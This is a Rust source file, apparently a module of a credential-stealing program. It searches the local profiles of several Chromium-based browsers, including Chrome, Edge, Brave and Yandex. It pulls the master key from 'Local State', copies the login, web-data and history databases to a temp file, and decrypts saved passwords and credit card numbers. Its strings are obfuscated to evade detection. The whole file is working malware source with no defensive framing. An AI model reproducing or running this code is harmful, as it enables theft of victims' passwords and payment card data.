#![allow(non_snake_case)]
#![allow(dead_code)]


use std::{
    fs,
    path::{PathBuf, Path},
    fmt::Display, 
};

use sqlite::{
    State,
    Connection,
    Statement,
};

use anyhow::Result;

use obfstr::obfstr;

use crate::browser_util::*;


#[derive(Debug, Default)]
pub struct Browser {
    pub Logins: Vec<LoginData>,     
    pub Creditcards: Vec<Creditcard>,
    pub BrowserHistory: Vec<String>,
}

#[derive(Debug)]
pub struct LoginData {
    pub Url: String,
    pub Username: String,
    pub Password: String,
}

#[derive(Debug)]
pub struct Creditcard {
    pub Name: String,
    pub CardNumber: String,
    pub ExpirationDate: String,
}

impl Browser {

    #[inline(always)]
    pub fn new() -> Self {
        Self::default()
    }

    #[inline]
    pub fn clear(&mut self) {
        self.BrowserHistory.clear();
        self.Creditcards.clear();
        self.Logins.clear(); 
    }

    pub fn refresh (
        &mut self,
        logins: bool, 
        credit_cards: bool, 
        browser_history: bool
    ) -> Result<()>
    {
        if logins { self.Logins.clear(); }
        if credit_cards { self.Creditcards.clear(); }
        if browser_history { self.BrowserHistory.clear(); }

        self.capture(logins, credit_cards, browser_history)?;
        Ok(())
    }

    pub fn refresh_all(&mut self) -> Result<()> {
        self.clear(); 
        self.capture(true, true, true)?;
        Ok(())    
    }
    
    #[inline]
    pub fn get_logins(&self) -> Option<&[LoginData]> {
        if self.Logins.is_empty() {
            return None;
        } 

        Some(&self.Logins)
    }

    #[inline]
    pub fn get_creditcards(&self) -> Option<&[Creditcard]> {
        if self.Creditcards.is_empty() {
            return None;
        }

        Some(&self.Creditcards)
    }

    #[inline]
    pub fn get_browser_history(&self) -> Option<&[String]> {
        if self.BrowserHistory.is_empty() {
            return None;
        }

        Some(&self.BrowserHistory)
    }
    
    fn capture(
        &mut self, 
        logins: bool, 
        credit_cards_: bool, 
        browser_history_: bool
    ) -> Result<()> 
    {

        let BROWSERS: [&str; 8] = [
            "7star\\7star",
            "Sputnik\\Sputnik",
            "Google\\Chrome",
            "Google\\Chrome SxS",
            "Microsoft\\Edge",
            "uCozMedia\\Uran",
            "Yandex\\YandexBrowser",
            "BraveSoftware\\Brave-Browser",
        ];

        let PROFILES: [&str; 6] = [
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
        ];

        let local_appdata = std::env::var(obfstr!("LOCALAPPDATA"))?;

        let mut temp_file = std::env::temp_dir();
        temp_file.push(obfstr!("23jf93f")); 

        let mut current = PathBuf::new();
        for browser in BROWSERS {
            current.clear();
            current.push(&local_appdata);
            current.push(browser);
            current.push(obfstr!("User Data"));
            if current.exists() == false { continue; }

            current.push(obfstr!("Local State"));
            let master_key = get_master_key_from_Local_State(&current).unwrap(); 
            current.pop();

            for profile in PROFILES {
                current.push(profile);
                if current.exists() {

                    if logins {
                        current.push(obfstr!("Login Data"));
                        if fs::copy(&current,  &temp_file).is_ok(){
                            self.capture_logins_from(&temp_file, &master_key).unwrap(); 
                        }
                        current.pop();
                    }

                    if credit_cards_ {
                        current.push(obfstr!("Web Data"));
                        if fs::copy(&current, &temp_file).is_ok() {
                            self.capture_creditcards_from(&temp_file, &master_key).unwrap();
                        }
                        current.pop();
                    }

                    if browser_history_ {
                        current.push(obfstr!("History"));
                        if fs::copy(&current, &temp_file).is_ok() {
                            self.capture_browser_history_from(&temp_file).unwrap();
                        }
                        current.pop();
                    }
                }
                current.pop();
            }
        }

        let _ = std::fs::remove_file(temp_file);
        self.BrowserHistory.dedup();

        Ok(())
    }

    #[inline]
    fn capture_logins_from<P>(
        &mut self,
        db_path: P, 
        decryption_key: &[u8], 
    ) -> Result<()> 
    where
        P: AsRef<Path>,
    {
        let conn: Connection = sqlite::open(db_path)?;
        let mut statement: Statement<'_> = conn.prepare(obfstr!("SELECT action_url, username_value, password_value FROM logins"))?;

        while let State::Row = statement.next()? {
            let encrypted_passowrd: Vec<u8> = statement.read(2).unwrap_or_default();

            self.Logins.push( LoginData {
                Url: statement.read(0).unwrap_or_default(),
                Username: statement.read(1).unwrap_or_default(),
                Password: decrypt_aes256gcm(&encrypted_passowrd, decryption_key).unwrap_or_else(|_| "Error".to_string()),
            });
        } 
        Ok(())
    }

    #[inline]
    fn capture_browser_history_from<P>(
        &mut self,
        db_path: P, 
    ) -> Result<()>
    where
        P: AsRef<Path>,
    {
        let conn: Connection = sqlite::open(db_path)?;
        let mut statement: Statement<'_> = conn.prepare(obfstr!("SELECT title FROM urls"))?;

        while let State::Row = statement.next()? {

            if cfg!(debug_assertions) {

                let value = statement.read::<String, _>(0) .unwrap();
                if value.len() != 0 { 
                    self.BrowserHistory.push(value);
                }

            } else {

                if let Ok(value) = statement.read::<String, _>(0) {
                    if value.len() != 0 {
                        self.BrowserHistory.push(value);
                    }
                }

            }
        }  

        Ok(())
    }


    #[inline]
    fn capture_creditcards_from<P>(
        &mut self,
        db_path: P, 
        decryption_key: &[u8], 
    ) -> Result<()>
    where 
        P: AsRef<Path>,
    { 
    
        let conn: Connection = sqlite::open(db_path)?;
        let mut statement: Statement<'_> = conn.prepare(obfstr!("SELECT name_on_card, expiration_year,  expiration_month, card_number_encrypted FROM credit_cards"))?;

        while let State::Row = statement.next()? {
            let encrypted_number: Vec<u8> = statement.read(3)?;
            
            self.Creditcards.push( Creditcard {
                Name: statement.read(0).unwrap_or_default(),
                ExpirationDate: (statement.read::<String, _>(1).unwrap_or_default() + "-" + &statement.read::<String, _>(2).unwrap_or_default()),
                CardNumber: decrypt_aes256gcm(&encrypted_number, decryption_key)?,
            });
        } 
        
        Ok(())
    }   
}

impl Display for LoginData {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "Url: {}\nUsername: {}\nPassword: {}", 
            self.Url, 
            self.Username, 
            self.Password
        )
    }
}

impl Display for Creditcard {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "Name: {}\nEard Number: {}\nExpiration Data: {}", 
            self.Name, 
            self.CardNumber, 
            self.ExpirationDate
        )
    }
}